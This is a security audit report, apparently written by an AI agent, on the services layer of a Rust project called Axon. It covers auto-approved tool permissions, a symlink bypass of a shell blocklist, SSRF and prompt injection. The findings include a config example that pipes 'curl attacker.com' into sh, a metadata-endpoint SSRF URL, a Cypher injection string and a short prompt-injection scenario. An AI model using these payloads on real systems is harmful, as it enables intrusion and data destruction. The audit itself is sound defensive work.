# Security Audit: Axon Services Layer (`crates/services/`)

**Date:** 2026-03-15
**Auditor:** Security Audit Agent (Opus 4.6)
**Scope:** `crates/services/` -- 35 Rust files, ~7,400 lines
**Framework:** Rust + tokio + ACP (Agent Client Protocol)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Critical Findings](#critical-findings)
3. [High Severity Findings](#high-severity-findings)
4. [Medium Severity Findings](#medium-severity-findings)
5. [Low Severity Findings](#low-severity-findings)
6. [Informational / Positive Security Observations](#informational--positive-security-observations)
7. [Remediation Priority Matrix](#remediation-priority-matrix)

---

## Executive Summary

The Axon services layer is a well-structured abstraction that provides typed entry points for CLI, MCP, and web route consumers. The codebase shows evidence of security-conscious design: environment variable allowlisting for subprocess spawning, shell interpreter blocklists, CWD validation, parameterized SQL queries, permission timeout guards with RAII cleanup, and cross-session collision prevention.

However, the audit identified **16 findings** across severity levels:

| Severity | Count |
|----------|-------|
| Critical | 1     |
| High     | 3     |
| Medium   | 6     |
| Low      | 6     |

The most significant issues center around: (1) an unbounded Qdrant collection scan creating a denial-of-service vector, (2) auto-approve-by-default for ACP permissions, (3) silent data loss through serialization fallbacks, and (4) Neo4j Cypher injection risk via the graph explore function.

---

## Critical Findings

### SEC-01: Unbounded Qdrant Collection Scroll in `graph_build` -- Denial of Service

**Severity:** Critical
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**File:** `graph.rs`, line 42
**CVSS Estimate:** 7.5 (High)

**Description:**

When `graph_build` is called without a URL filter (i.e., with `--all` or a domain filter), it calls `qdrant_indexed_urls(cfg, None)` which scrolls the entire Qdrant collection with no limit. On the production collection with 2.57M+ points (per MEMORY.md), this can consume gigabytes of memory and take minutes to complete.

```rust
let mut urls = if let Some(url) = url {
    vec![url.to_string()]
} else {
    qdrant_indexed_urls(cfg, None).await?  // <-- unbounded scroll
};
```

**Attack Scenario:**

An MCP client or web UI user triggers `graph build --all` on a large collection. The service allocates unbounded memory collecting all URLs, starving other services of resources. Repeated calls create a trivial amplification DoS.

**Remediation:**

Add a configurable limit parameter, defaulting to a safe ceiling. Use the same facet-based approach that was applied to `sources` (per MEMORY.md, the facet fix reduced `sources` from 82s to 8ms).

```rust
const GRAPH_BUILD_URL_LIMIT: usize = 50_000;

let mut urls = if let Some(url) = url {
    vec![url.to_string()]
} else {
    qdrant_indexed_urls(cfg, Some(GRAPH_BUILD_URL_LIMIT)).await?
};
```

---

## High Severity Findings

### SEC-02: ACP Auto-Approve Defaults to `true` -- Implicit Trust Escalation

**Severity:** High
**CWE:** CWE-284 (Improper Access Control)
**File:** `acp/permission.rs`, lines 21-25

**Description:**

The `resolve_acp_auto_approve()` function defaults to `true` unless `AXON_ACP_AUTO_APPROVE` is explicitly set to `"false"`. This means by default, all ACP adapter tool calls -- including filesystem writes, terminal commands, and arbitrary code execution -- are auto-approved without human review.

```rust
pub(super) fn resolve_acp_auto_approve() -> bool {
    std::env::var("AXON_ACP_AUTO_APPROVE")
        .map(|v| v != "false")
        .unwrap_or(true)  // <-- defaults to auto-approve everything
}
```

The auto-approve logic further prefers `AllowAlways` over `AllowOnce`:

```rust
let outcome = args.options.iter()
    .find(|opt| matches!(opt.kind, PermissionOptionKind::AllowAlways))  // most permissive first
    .or_else(|| { ... AllowOnce ... })
```

**Attack Scenario:**

A compromised or malicious MCP server request triggers an ACP adapter prompt that invokes destructive tools (file deletion, arbitrary shell commands). With auto-approve defaulting to true, the tool call executes without any human gate. The adapter's `enable_fs` and `enable_terminal` capabilities are both `true` by default in `AcpAdapterCommand`.

**Remediation:**

1. Invert the default to `false` (require explicit opt-in for auto-approve).
2. Prefer `AllowOnce` over `AllowAlways` in the auto-approve selector.
3. Document the security implications in `.env.example`.

```rust
pub(super) fn resolve_acp_auto_approve() -> bool {
    std::env::var("AXON_ACP_AUTO_APPROVE")
        .map(|v| v == "true")
        .unwrap_or(false)  // safe default: require human approval
}
```

---

### SEC-03: Neo4j Cypher Parameter Injection via `graph_explore`

**Severity:** High
**CWE:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
**File:** `graph.rs`, lines 122-133

**Description:**

The `graph_explore` function passes user input (`entity`) as a parameter to a Cypher query via `serde_json::json!({ "name": entity })`. While this is the correct parameterized approach for Neo4j, the safety depends entirely on the `Neo4jClient::query` implementation correctly using Cypher parameters (via `$name`) rather than string interpolation.

```rust
pub async fn graph_explore(
    cfg: &Config,
    entity: &str,  // user-supplied, no validation
) -> Result<GraphExploreResult, Box<dyn Error>> {
    let neo4j = require_neo4j(cfg)?;
    let rows = neo4j
        .query(
            "MATCH (e:Entity {name: $name}) ...",
            serde_json::json!({ "name": entity }),  // relies on Neo4jClient implementation
        )
        .await?;
```

**Risk Assessment:**

The query string correctly uses `$name` (Cypher parameterization syntax), which is the safe pattern. However, the `entity` parameter has zero validation -- no length check, no character allowlist, no sanitization. If the `Neo4jClient::query` implementation ever changes to use string formatting instead of proper parameter binding, this becomes a direct injection vector.

**Attack Scenario:**

If `Neo4jClient::query` uses string interpolation internally (e.g., `format!("... {{name: '{}'}}", entity)`), an attacker could inject: `'}) DETACH DELETE e //` to delete graph data. Even with proper parameterization, an unbounded-length entity name could cause memory pressure.

**Remediation:**

Add defensive input validation at the service boundary:

```rust
pub async fn graph_explore(
    cfg: &Config,
    entity: &str,
) -> Result<GraphExploreResult, Box<dyn Error>> {
    let entity = entity.trim();
    if entity.is_empty() {
        return Err("entity name cannot be empty".into());
    }
    if entity.len() > 1000 {
        return Err("entity name exceeds maximum length (1000)".into());
    }
    // ... proceed with query
```

Additionally, audit `Neo4jClient::query` to confirm it uses the bolt driver's native parameter binding, not string interpolation.

---

### SEC-04: Adapter Command Validation Bypass via Symlink Indirection

**Severity:** High
**CWE:** CWE-59 (Improper Link Resolution Before File Access) + CWE-78 (OS Command Injection)
**File:** `acp/mapping/validation.rs`, lines 74-87

**Description:**

The `validate_adapter_command` function resolves symlinks via `std::fs::canonicalize` to detect when a symlink points to a blocked shell. However, this check only runs when the program string contains a path separator (`/` or `\\`). Bare names like `"my-adapter"` skip the symlink resolution entirely and rely on `execvp` PATH resolution, which can resolve to a symlink to a shell.

```rust
// Symlink check only runs for path-like programs
if (program.contains('/') || program.contains('\\'))
    && let Ok(canonical) = std::fs::canonicalize(path)
    && let Some(canon_name) = canonical.file_name()...
```

**Attack Scenario:**

1. Attacker places a symlink at `~/bin/my-adapter -> /bin/bash` in a directory on `$PATH`.
2. Attacker sends `AcpAdapterCommand { program: "my-adapter", args: ["-c", "malicious_payload"] }`.
3. `validate_adapter_command` sees a bare name, skips symlink resolution.
4. `execvp("my-adapter")` finds it on PATH, resolves the symlink, and spawns bash with the injected command.

**Mitigating Factors:**

The attacker must be able to control the PATH or place files in a PATH directory. The `env_clear()` + allowlist approach means `PATH` is inherited from the parent, but if the parent's PATH includes user-writable directories (common on Linux with `~/.local/bin`), this is exploitable.

**Remediation:**

For bare names, resolve via `which` or `std::process::Command::new(program).output()` to find the actual binary path, then apply the same `canonicalize` + blocked-shells check:

```rust
// After basename check, for bare names, resolve the actual binary path
if !program.contains('/') && !program.contains('\\') {
    if let Ok(output) = std::process::Command::new("which").arg(program).output() {
        if let Ok(resolved) = std::str::from_utf8(&output.stdout) {
            let resolved = resolved.trim();
            if let Ok(canonical) = std::fs::canonicalize(resolved) {
                // ... apply same blocked_shells check on canonical name
            }
        }
    }
}
```

---

## Medium Severity Findings

### SEC-05: Silent Data Loss via `unwrap_or(Value::Null)` Serialization Fallbacks

**Severity:** Medium
**CWE:** CWE-755 (Improper Handling of Exceptional Conditions)
**Files:**
- `embed.rs:31` -- `serde_json::to_value(value).unwrap_or(serde_json::Value::Null)`
- `extract.rs:30` -- same pattern
- `ingest.rs:47` -- same pattern
- `refresh.rs:41` -- same pattern

**Description:**

Four service status functions silently convert serialization failures into `Value::Null`, returning a "successful" result with no data. The caller has no way to distinguish "job has no data" from "serialization failed silently." This can mask data corruption or schema mismatches.

```rust
pub async fn embed_status(...) -> Result<Option<EmbedJobResult>, Box<dyn Error>> {
    let job = get_embed_job(cfg, id).await?;
    Ok(job.map(|value| {
        map_embed_job_result(serde_json::to_value(value).unwrap_or(serde_json::Value::Null))
        //                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        // Serialization failure silently becomes null
    }))
}
```

**Attack Scenario:**

A malformed job record (corrupted database row, unexpected type in JSONB column) causes `serde_json::to_value` to fail. The service returns `null` payload. The MCP handler forwards this to a client, which may interpret null as "completed with no results" and delete the source data, causing data loss.

**Remediation:**

Propagate the serialization error instead of silently swallowing it:

```rust
Ok(job.map(|value| {
    let payload = serde_json::to_value(&value)
        .map_err(|e| format!("failed to serialize job {}: {e}", id))?;
    Ok(map_embed_job_result(payload))
}).transpose()?)
```

---

### SEC-06: Information Disclosure via Debug Report Doctor Payload

**Severity:** Medium
**CWE:** CWE-200 (Exposure of Sensitive Information)
**File:** `debug.rs`, lines 28-45, 69-78

**Description:**

The `debug_report` function sends the full `doctor_report` JSON (containing connection strings, service URLs, port mappings, and infrastructure topology) to an external LLM endpoint, then returns both the doctor report and the LLM analysis in the result payload.

```rust
let prompt = format!(
    "... Doctor report JSON:\n{}",
    serde_json::to_string_pretty(&doctor_report)?  // full infra details sent to LLM
);
```

The result also includes `base_url` (the LLM endpoint URL):

```rust
"llm_debug": {
    "model": resolve_openai_model(cfg),
    "base_url": cfg.openai_base_url,  // internal infrastructure URL exposed
    "analysis": analysis,
}
```

**Attack Scenario:**

If the LLM endpoint is externally hosted (even accidentally), internal infrastructure details (service ports, database connection states, service names) are exfiltrated. Even with a self-hosted LLM, the response payload containing `base_url` and full doctor report can leak to unauthorized consumers if the web API is improperly authenticated.

**Remediation:**

1. Redact sensitive fields from the doctor report before sending to the LLM.
2. Remove `base_url` from the response payload.
3. Add a guard that refuses to run `debug` when `OPENAI_BASE_URL` points to a non-local address.

---

### SEC-07: Unvalidated `user_context` Injection into LLM Prompt

**Severity:** Medium
**CWE:** CWE-77 (Improper Neutralization of Special Elements used in a Command)
**File:** `debug.rs`, line 37

**Description:**

The `debug_report` function includes arbitrary `user_context` directly in the LLM prompt without sanitization:

```rust
let prompt = format!(
    "... Optional operator context:\n{}\n\n Doctor report JSON:\n{}",
    if user_context.is_empty() { "(none)" } else { user_context },
    serde_json::to_string_pretty(&doctor_report)?
);
```

**Attack Scenario:**

A prompt injection attack via `user_context` could instruct the LLM to:
- Exfiltrate data from the doctor report in a specific format
- Return misleading remediation commands (e.g., `rm -rf /`)
- Override the system prompt to behave as a different agent

**Remediation:**

Sanitize `user_context` by truncating to a maximum length and escaping control sequences:

```rust
let sanitized_context = user_context
    .chars()
    .take(2000)
    .filter(|c| !c.is_control() || *c == '\n')
    .collect::<String>();
```

---

### SEC-08: ACP Session Cache Has No Size Limit -- Memory Exhaustion

**Severity:** Medium
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
**File:** `acp/session_cache.rs`, lines 124-137

**Description:**

`AcpSessionCache` uses an unbounded `DashMap` with no maximum session count. The only eviction mechanism is a TTL-based reaper that runs every 60 seconds. Between reaper runs, an attacker could create an unlimited number of sessions.

```rust
pub fn insert(
    &self,
    agent_key: String,
    handle: Arc<AcpConnectionHandle>,
    permission_responders: PermissionResponderMap,
) -> Arc<CachedSession> {
    // No size check -- unbounded insertion
    let session = Arc::new(CachedSession::new(handle, permission_responders));
    self.sessions.insert(agent_key, Arc::clone(&session));
```

Each `AcpConnectionHandle` holds a `spawn_blocking` thread and a tokio runtime. Creating thousands of sessions would exhaust thread pool capacity and memory.

**Remediation:**

Add a maximum session count with LRU eviction:

```rust
const MAX_CACHED_SESSIONS: usize = 100;

pub fn insert(&self, ...) -> Arc<CachedSession> {
    if self.sessions.len() >= MAX_CACHED_SESSIONS {
        // Evict the oldest session
        self.evict_oldest();
    }
    // ... existing insert logic
}
```

---

### SEC-09: `test-helpers` Feature Gate for `spawn_adapter_skip_validation`

**Severity:** Medium
**CWE:** CWE-489 (Active Debug Code)
**File:** `acp.rs`, lines 256-273

**Description:**

`spawn_adapter_skip_validation` is documented as test-only and "gated behind the `test-helpers` feature," but the actual code uses `#[doc(hidden)]` rather than `#[cfg(feature = "test-helpers")]`:

```rust
/// Gated behind the `test-helpers` feature so it cannot be called in
/// production builds.
#[doc(hidden)]  // <-- doc(hidden) is NOT a feature gate
pub fn spawn_adapter_skip_validation(
    &self,
) -> Result<tokio::process::Child, Box<dyn Error>> {
```

`#[doc(hidden)]` only hides from documentation -- the function is fully compiled and callable in production builds. The comment claims feature-gating, but the implementation does not enforce it.

**Remediation:**

Add the actual feature gate:

```rust
#[cfg(any(test, feature = "test-helpers"))]
#[doc(hidden)]
pub fn spawn_adapter_skip_validation(...) { ... }
```

---

### SEC-10: MCP Server Configuration Passthrough Without URL Validation

**Severity:** Medium
**CWE:** CWE-918 (Server-Side Request Forgery)
**File:** `acp/mapping.rs`, lines 340-368

**Description:**

`convert_mcp_servers` passes `AcpMcpServerConfig::Http { url }` directly to the ACP SDK without validating the URL:

```rust
AcpMcpServerConfig::Http { name, url } => {
    McpServer::Http(McpServerHttp::new(name.clone(), url.clone()))
    // No validation of `url` -- could be an internal service, file://, etc.
}
```

For `Stdio` configs, the `command` field is passed through without any validation against the blocked shells list that protects the main adapter command.

**Attack Scenario:**

A frontend client sends an `AcpPromptTurnRequest` with `mcp_servers` containing `{ "transport": "http", "name": "evil", "url": "http://169.254.169.254/latest/meta-data/" }` -- SSRF against cloud metadata endpoints (less relevant for self-hosted, but still a risk for internal services like Redis, Qdrant, etc.).

For stdio: `{ "transport": "stdio", "name": "evil", "command": "bash", "args": ["-c", "curl attacker.com | sh"] }` -- arbitrary command execution.

**Remediation:**

1. Apply `validate_url()` (from `crates/core/http.rs`, which includes SSRF checks) to HTTP MCP server URLs.
2. Apply `validate_adapter_command()` to stdio MCP server commands.

---

## Low Severity Findings

### SEC-11: SQL Queries in `graph_status` Use Hardcoded Table Names (Not Parameterized)

**Severity:** Low
**CWE:** CWE-89 (SQL Injection) -- mitigated
**File:** `graph.rs`, lines 73-98

**Description:**

The SQL queries in `graph_status` use hardcoded query strings with no user-supplied input interpolation. The `sqlx::query_as` calls use compile-time-checked queries against `axon_graph_jobs`. There is no user input in these queries, so there is no injection vector in the current code.

This is listed as Low because the pattern of inline SQL in a service layer (rather than a repository layer) creates a maintenance risk: future developers might add parameterized filters without using bind parameters.

**Remediation:**

No immediate action needed. Consider extracting SQL queries to a dedicated repository module for consistency with the job modules.

---

### SEC-12: Stderr Truncation May Lose Security-Relevant Error Context

**Severity:** Low
**CWE:** CWE-778 (Insufficient Logging)
**File:** `acp/session.rs`, lines 90-98

**Description:**

Adapter stderr output is truncated at 500 characters:

```rust
if trimmed.len() > 500 {
    format!("ACP adapter stderr: {}… (truncated, {} bytes total)", &trimmed[..500], trimmed.len())
```

Security-relevant error messages from the adapter (e.g., authentication failures, permission denials, certificate errors) may be truncated, losing critical diagnostic context.

**Remediation:**

Increase the truncation limit to 2000 characters or log the full message at DEBUG level while keeping the truncated version at WARN.

---

### SEC-13: Replay Buffer Lock Ordering in `CachedSession`

**Severity:** Low (Phase 1 flagged as deadlock risk -- actual analysis shows it is mitigated)
**CWE:** CWE-667 (Improper Locking)
**File:** `acp/session_cache.rs`, lines 69-98

**Description:**

Phase 1 flagged a deadlock risk from dual `Mutex` usage in `buffer_event` and `drain_replay_buffer`. Analysis shows both functions acquire locks in the same order (`replay_buffer_bytes` first, then `replay_buffer`), which eliminates the deadlock vector. The risk is that a future refactoring could reverse the lock order.

```rust
pub fn buffer_event(&self, json: String) {
    let mut bytes = self.replay_buffer_bytes.lock()...;  // Lock 1
    let mut buf = self.replay_buffer.lock()...;           // Lock 2 (same order in drain)
}
```

**Remediation:**

Consolidate both fields into a single struct behind one `Mutex` to eliminate the ordering concern entirely:

```rust
struct ReplayBuffer {
    messages: Vec<String>,
    total_bytes: usize,
}
replay_buffer: std::sync::Mutex<ReplayBuffer>,
```

---

### SEC-14: Environment Variable `AXON_ACP_AUTO_APPROVE` Has Weak Parsing

**Severity:** Low
**CWE:** CWE-704 (Incorrect Type Conversion)
**File:** `acp/permission.rs`, lines 22-25

**Description:**

The auto-approve env var check uses `v != "false"`, meaning any value other than the exact string `"false"` (including `"0"`, `"no"`, `"False"`, `"FALSE"`, empty string) enables auto-approve:

```rust
std::env::var("AXON_ACP_AUTO_APPROVE")
    .map(|v| v != "false")  // "False", "FALSE", "0", "no" all resolve to true
    .unwrap_or(true)
```

**Remediation:**

Use case-insensitive comparison with multiple false-like values:

```rust
.map(|v| !matches!(v.to_lowercase().as_str(), "false" | "0" | "no" | "off"))
```

---

### SEC-15: `ANTHROPIC_API_KEY` in ACP Env Allowlist

**Severity:** Low
**CWE:** CWE-200 (Exposure of Sensitive Information)
**File:** `acp.rs`, line 114

**Description:**

`ANTHROPIC_API_KEY` is in the `ACP_ENV_ALLOWLIST` and forwarded to adapter subprocesses. While this is intentionally needed for Claude CLI authentication, it means the API key is available in the subprocess environment. A compromised adapter could exfiltrate it.

The allowlist also includes `GOOGLE_APPLICATION_CREDENTIALS` (a file path to a service account key), `GEMINI_API_KEY`, and `GOOGLE_API_KEY`.

**Mitigating Factors:**

The `env_clear()` approach is already a strong defense-in-depth measure. The adapter needs these keys to function. The risk is inherent to the adapter subprocess model.

**Remediation:**

Document this as an accepted risk. Consider implementing key rotation monitoring and adapter output scanning for key-like patterns.

---

### SEC-16: No Rate Limiting on Session Cache Operations

**Severity:** Low
**CWE:** CWE-799 (Improper Control of Interaction Frequency)
**File:** `acp/session_cache.rs`

**Description:**

There is no rate limiting on `SESSION_CACHE.insert()`, `SESSION_CACHE.get()`, or `SESSION_CACHE.register_session_id()`. A rapid sequence of WebSocket connections could create many sessions between reaper intervals. This is partially mitigated by SEC-08 (unbounded cache size), but the rate of resource allocation is also a concern.

**Remediation:**

Add a per-client-IP rate limiter at the WebSocket handler level (outside this crate's scope) and a global insert rate limit in the session cache.

---

## Informational / Positive Security Observations

The following patterns demonstrate good security practices already present in the codebase:

1. **Environment allowlisting (SEC-GOOD-1):** `apply_env_allowlist()` in `acp.rs` uses `env_clear()` + explicit allowlist, preventing accidental credential leakage to subprocesses. `OPENAI_*` vars are intentionally excluded with documented reasoning.

2. **Shell interpreter blocklist (SEC-GOOD-2):** `validate_adapter_command()` blocks 11 known shell interpreters by basename, with case-insensitive matching, `.exe` suffix handling, and symlink resolution for path-like programs.

3. **Cross-session permission isolation (SEC-GOOD-3):** `PermissionResponderMap` uses `(session_id, tool_call_id)` composite keys to prevent cross-session collisions. Blank `session_id` is rejected early with a clear error.

4. **Permission timeout with RAII cleanup (SEC-GOOD-4):** `handle_interactive_permission` uses a `PermissionGuard` struct that removes the DashMap entry on drop, covering cancellation, timeout, and normal exit paths.

5. **CWD validation (SEC-GOOD-5):** `validate_session_cwd` enforces absolute paths, existence checks, and directory-type checks before passing CWD to adapters.

6. **Adapter process lifecycle (SEC-GOOD-6):** `kill_on_drop(true)` + `AdapterGuard` RAII ensure subprocesses are cleaned up even on error paths and timeouts.

7. **URL validation at service boundary (SEC-GOOD-7):** `scrape.rs` and `map.rs` call `validate_url()` before processing, which includes SSRF checks from `crates/core/http.rs`.

8. **Bounded replay buffer (SEC-GOOD-8):** Session replay buffers enforce both message count (4096) and byte size (4 MiB) limits with proper counter reset on drain.

9. **Model string validation (SEC-GOOD-9):** `validate_model_string()` restricts model names to `[a-zA-Z0-9-_./: ]`, preventing injection through model config options.

10. **Permission option validation (SEC-GOOD-10):** When the frontend sends a permission response, the `option_id` is validated against the original request's options list. Unknown option IDs are rejected.

---

## Remediation Priority Matrix

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| **P0 -- Fix Now** | SEC-01 (Unbounded Qdrant scroll) | Low | Service availability |
| **P0 -- Fix Now** | SEC-09 (`spawn_adapter_skip_validation` not gated) | Trivial | Production code safety |
| **P1 -- Next Sprint** | SEC-02 (Auto-approve default) | Low | Permission model integrity |
| **P1 -- Next Sprint** | SEC-04 (Symlink bypass for bare adapter names) | Medium | Command injection |
| **P1 -- Next Sprint** | SEC-10 (MCP server config passthrough) | Medium | SSRF + command injection |
| **P2 -- Planned** | SEC-03 (Neo4j input validation) | Low | Defense-in-depth |
| **P2 -- Planned** | SEC-05 (Silent serialization fallbacks) | Low | Data integrity |
| **P2 -- Planned** | SEC-06 (Debug report info disclosure) | Medium | Information leak |
| **P2 -- Planned** | SEC-07 (LLM prompt injection) | Low | Prompt integrity |
| **P2 -- Planned** | SEC-08 (Unbounded session cache) | Low | Memory exhaustion |
| **P3 -- Backlog** | SEC-11-16 (Low severity items) | Low | Hardening |

---

*End of security audit report. All findings are based on static analysis of the `crates/services/` source code. Runtime testing, fuzzing, and dependency CVE scanning were outside this audit's scope.*
